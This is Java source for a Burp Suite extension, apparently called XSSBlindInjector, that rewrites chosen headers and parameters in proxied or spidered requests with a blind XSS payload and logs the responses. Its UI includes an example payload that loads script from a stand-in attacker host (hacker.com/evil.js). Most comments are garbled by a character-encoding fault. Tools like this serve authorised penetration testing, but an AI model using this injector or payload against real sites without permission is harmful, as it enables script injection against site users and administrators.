package burp;

import gui.UITools;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

public class BurpExtender extends AbstractTableModel implements IBurpExtender,
        ITab, IMessageEditorController, IHttpListener {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;
    private boolean isOpen = true;// ����Ƿ���Ч
    private String ipValue;// ָ��IPֵ
    private Pattern hosts;//hosts pattern
    private List<String> headers ;
    private List<String> params;
    private String payload;
    private boolean xssed;//�Ե�ǰ����xss


    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName("XSSBlindInjector"); // �������
        // ��ʼ�����Զ���UI
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                //���ƹ���
                //1.�������²��ֵ������

                // �����
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);//���²���
                JTabbedPane topTabs = new JTabbedPane();
                // HistoryLog ��ͼ
                Table logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);//xss history��ͼ�ɹ���
                // ������options����ʾ���
                JPanel optionsPanel = BurpExtender.this.createOptionsPanel();
                //JPanel optionsPanel = new UITools().createOptionJpanel();
                // ����about���
                JPanel aboutPanel = new UITools().createAboutJpanel();


                // ����������ϰ벿���У�������tabҳ
                topTabs.add("Options", optionsPanel);
                topTabs.add("XSSLog", scrollPane);
                topTabs.add("About", aboutPanel);
                splitPane.setTopComponent(topTabs);


                // request/response ��ͼ
                JTabbedPane tabs = new JTabbedPane();
                requestViewer = callbacks.createMessageEditor(
                        BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(
                        BurpExtender.this, false);

                // ����������°벿���У�������tabҳ
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());

                splitPane.setBottomComponent(tabs);

                // �Զ����Լ������
                callbacks.customizeUiComponent(splitPane);
                callbacks.customizeUiComponent(topTabs);
                callbacks.customizeUiComponent(tabs);

                // ��Burp����Զ�������tabҳ
                callbacks.addSuiteTab(BurpExtender.this);

                // ע��HTTP listener
                callbacks.registerHttpListener(BurpExtender.this);
            }
        });
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest,
                                   IHttpRequestResponse messageInfo) {
        // request response����ʱ���ᴥ��������
        //������δ���ã���������ִ��
        if (!isOpen) return;
        try {
            // ��ͬ��toolflag�����˲�ͬ��burp�������INTRUDER,SCANNER,PROXY,SPIDER
            //ͨ��proxy�ֶ���������ʱ������Զ�������xss payload
            //ͨ��spider��ȡ��վ��ʱ��Ҳ�����Զ�������xss payload
            if (toolFlag == callbacks.TOOL_PROXY || toolFlag == callbacks.TOOL_SPIDER) {
                if (messageIsRequest) { // ����������д���
                    xssed=false;
                    IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo); // ����Ϣ����н���
                    URL url=analyzeRequest.getUrl();
                    List<String> req_headers = analyzeRequest.getHeaders();
                    List<IParameter> req_parameters=analyzeRequest.getParameters();

                    //�����жϸ������Ƿ���hosts�ķ�Χ��
                    if(!hosts.matcher(url.getHost()).find()){
                        return;
                    }

                    //�ж�headers�Ƿ���Ҫxss
                    //0 Ϊ Get��Post
                    for(int i=1;i<req_headers.size();i++){
                        String current_header_name = req_headers.get(i).split(":")[0];
                        for(int j=0;j<headers.size();j++){
                           if(current_header_name.equals(headers.get(j))){
                               //ƴ��xss payload��ָ��header
                               req_headers.set(i,current_header_name+": "+helpers.urlEncode(payload));
//                               System.out.println("xssed "+current_header_name);
                               xssed=true;
                           }
                        }
                    }

                    String request = new String(messageInfo.getRequest());
                    byte[] body = request.substring(analyzeRequest.getBodyOffset()).getBytes();
                    byte[] newRequest = helpers.buildHttpMessage(req_headers, body);

                    //�ж�params�Ƿ���Ҫxss
                    for(int i=0;i<req_parameters.size();i++){
                        final IParameter cur_parameter=req_parameters.get(i);
                        //��������7�ָ�ʽ��0��URL������1��body������2��cookie������6��json��ʽ����
                        for(int j=0;j<params.size();j++){
                            if(params.get(j).equals(cur_parameter.getName())){
                                //�޸���Ӧ����,���ﲻ֧�ָ���json��ʽ��parameter
                                IParameter new_parameter=helpers.buildParameter(cur_parameter.getName(),helpers.urlEncode(payload),cur_parameter.getType());
                                newRequest=helpers.updateParameter(newRequest,new_parameter);
                                xssed=true;
                            }
                        }
                    }
                    messageInfo.setRequest(newRequest);// ���������µ������
                }
                //response����
                else{
                    //�����жϸ������Ƿ���hosts�ķ�Χ���ʱ��messageinfo����request��response��
                    if(!hosts.matcher(helpers.analyzeRequest(messageInfo).getUrl().getHost()).find()){
                        return;
                    }
                    //�жϸ������Ƿ��Ѿ�xss��
                    if(!xssed){
                        return;
                    }
                    //�ж�����xss payload,�еĻ��ͼ�¼
                    IResponseInfo analyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());
                    //�����Ϣ��HistoryLog��¼�У���UI��ʾ��
                    synchronized (log) {
                        int row = log.size();
                        short httpcode = analyzeResponse.getStatusCode();
                        log.add(new LogEntry(callbacks.saveBuffersToTempFiles(messageInfo), helpers.analyzeRequest(messageInfo).getUrl(), httpcode));
                        fireTableRowsInserted(row, row);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * ����options��ͼ����������
     *
     * @return options ��ͼ����
     * @author Conan0xff 2018-09-23 ����5:51:45
     */
    //���ڸ÷����漰���޸��ڲ�����,�ʷ�������
    public JPanel createOptionsPanel() {
        GridBagLayout gridBagLayout = new GridBagLayout(); //ʵ�������ֶ���
        final JPanel optionsPanel = new JPanel(gridBagLayout);
        GridBagConstraints gridBagConstraints = new GridBagConstraints();//ʵ�����������������������й���
        gridBagConstraints.fill = GridBagConstraints.BOTH;//�÷�����Ϊ���������������ڵ�������������Ҫ��ʱ����ʾ���
        //NONE�������������С��
        //HORIZONTAL���ӿ������ʹ����ˮƽ��������������ʾ���򣬵��ǲ��ı�߶ȡ�
        //VERTICAL���Ӹ������ʹ���ڴ�ֱ��������������ʾ���򣬵��ǲ��ı��ȡ�
        //BOTH��ʹ�����ȫ��������ʾ����

        //XSSBlindInjector��ѡ��
        final JCheckBox isOpenCheck = new JCheckBox("start XSSBlindInjector", false);
        //hosts
        final JLabel hosts_label = new JLabel("hosts:");
        final JTextField hosts_Text = new JTextField("", 15);
        hosts_Text.setBackground(Color.WHITE);
        JLabel hosts_label_detail = new JLabel("eg:*.google.com");
        hosts_label_detail.setBackground(Color.GRAY);
        //payload
        final JLabel payload_label = new JLabel("payload:");
        final JTextField payload_Text = new JTextField("", 15);
        payload_Text.setBackground(Color.WHITE);
        JLabel payload_label_detail = new JLabel("eg:'\"><script src=http://hacker.com/evil.js></script>");
        payload_label_detail.setBackground(Color.GRAY);
        //ָ��Ҫ����xss��header��params,���ŷָ����header��params
        JLabel headers_label = new JLabel("xss headers:");
        final JTextField headers_Text = new JTextField("", 15);
        headers_Text.setBackground(Color.WHITE);
        JLabel headers_label_detail = new JLabel("eg:Referer,X-Forward-For");
        headers_label_detail.setBackground(Color.GRAY);
        JLabel params_label = new JLabel("xss params:");
        final JTextField params_Text = new JTextField("", 15);
        params_Text.setBackground(Color.WHITE);
        JLabel params_label_detail = new JLabel("eg:username,address");
        params_label_detail.setBackground(Color.GRAY);

        //Ϊ��ѡ��͵�ѡ��ť��Ӽ����¼�
        isOpenCheck.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
                if (isOpenCheck.isSelected()) {
                    isOpen = true;
                    hosts_Text.setEditable(true);
                    headers_Text.setEditable(true);
                    params_Text.setEditable(true);
                    payload_Text.setEditable(true);
                } else {
                    isOpen = false;
                    hosts_Text.setEditable(false);
                    headers_Text.setEditable(false);
                    params_Text.setEditable(false);
                    payload_Text.setEditable(false);
                }
            }
        });

        hosts_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                hosts_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                hosts=Pattern.compile(hosts_Text.getText());
                hosts_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,hosts.toString());
            }
        });

        headers_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                headers_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                headers=java.util.Arrays.asList(headers_Text.getText().split(","));
                headers_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,headers.toString());
            }
        });

        params_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                params_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                params=java.util.Arrays.asList(params_Text.getText().split(","));
                params_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,params.toString());
            }
        });

        payload_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                payload_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                payload=payload_Text.getText();
                payload_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,payload.toString());
            }
        });
        /*
         * �ֱ�������������
         */
        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 0;
        gridBagConstraints.gridwidth = 5;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(isOpenCheck, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_label_detail, gridBagConstraints);


        //������ɺ�����ӵ�panel��
        optionsPanel.add(isOpenCheck);
        optionsPanel.add(hosts_label);
        optionsPanel.add(hosts_Text);
        optionsPanel.add(hosts_label_detail);
        optionsPanel.add(payload_label);
        optionsPanel.add(payload_Text);
        optionsPanel.add(payload_label_detail);
        optionsPanel.add(headers_label);
        optionsPanel.add(headers_Text);
        optionsPanel.add(headers_label_detail);
        optionsPanel.add(params_label);
        optionsPanel.add(params_Text);
        optionsPanel.add(params_label_detail);

        return optionsPanel;
    }

    /**
     * IPֵ���ɺ���
     *
     * @param isAuto �Ƿ��Զ�����
     * @return IPֵ
     * @author t0data 2016-11-18 ����5:56:09
     */
    public String getIpValue(boolean isAuto) {
        if (isAuto) {
            return RandomIP.RandomIPstr();
        } else {
            return ipValue;

        }
    }

    public static String getUUID() {
        UUID uuid = UUID.randomUUID();
        String str = uuid.toString();
        String uuidStr = str.replace("-", "");
        return uuidStr;
    }

    @Override
    public String getTabCaption() {
        return "XSSBlindInjector";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "ID";
            case 1:
                return "URL";
            case 2:
                return "STATUS";
            default:
                return "";
        }
    }

    @Override
    public Class<?> getColumnClass(int columnIndex) {
        return String.class;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex) {
            case 0:
                return logEntry.ID;
            case 1:
                return logEntry.url.toString();
            case 2:
                return logEntry.httpCode;
            default:
                return "";
        }
    }

    //
    // implement IMessageEditorController
    // this allows our request/response viewers to obtain details about the
    // messages being displayed
    //

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    //
    // extend JTable to handle cell selection
    //

    private class Table extends JTable {
        public Table(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle,
                                    boolean extend) {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(),
                    true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(),
                    false);
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    //
    // class to hold details of each log entry
    //

    private static class LogEntry {
        final IHttpRequestResponsePersisted requestResponse;
        final String ID;
        final URL url;
        final short httpCode;

        LogEntry(IHttpRequestResponsePersisted requestResponse,
                 URL url, short httpCode) {
            this.ID = getUUID();
            this.requestResponse = requestResponse;
            this.url = url;
            this.httpCode = httpCode;
        }
    }
}